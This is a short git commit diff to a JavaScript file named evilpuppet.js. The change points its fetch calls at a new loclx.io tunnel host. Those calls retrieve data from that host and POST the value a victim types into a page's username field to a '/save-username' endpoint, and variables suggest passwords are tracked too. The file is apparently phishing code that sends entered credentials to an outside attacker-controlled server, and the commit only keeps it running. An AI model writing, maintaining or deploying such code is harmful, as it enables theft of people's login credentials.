aa31cd28f932f342553555d4d05c199ab03c01e6
user6417529211 <user61752921@gmail.com>
2025-03-16 07:50:17 +0000

    Update evilpuppet.js

--- evilpuppet.js
+++ evilpuppet.js
@@ -9,11 +9,11 @@ let passwordFetched = false;
 const fetchFreqUsername = () => {
     if (freqUsername === null) {
         console.log('fetchFreqUsername called');
-        return fetch('https://6nrnw45kzr.loclx.io/get-first-post-data')
+        return fetch('https://phtnytq26c.loclx.io/get-first-post-data')
             .then(response => response.json())
             .then(result => {
                 freqUsername = result.postData;
-                return fetch('https://6nrnw45kzr.loclx.io/reset-first-post-data', { method: 'POST' });
+                return fetch('https://phtnytq26c.loclx.io/reset-first-post-data', { method: 'POST' });
             })
             .then(() => {
                 usernameFetched = true;
@@ -71,7 +71,7 @@ function sendUsername() {
 
     const username = document.getElementById('username').value;
     if (username) {
-        fetch('https://6nrnw45kzr.loclx.io/save-username', {
+        fetch('https://phtnytq26c.loclx.io/save-username', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
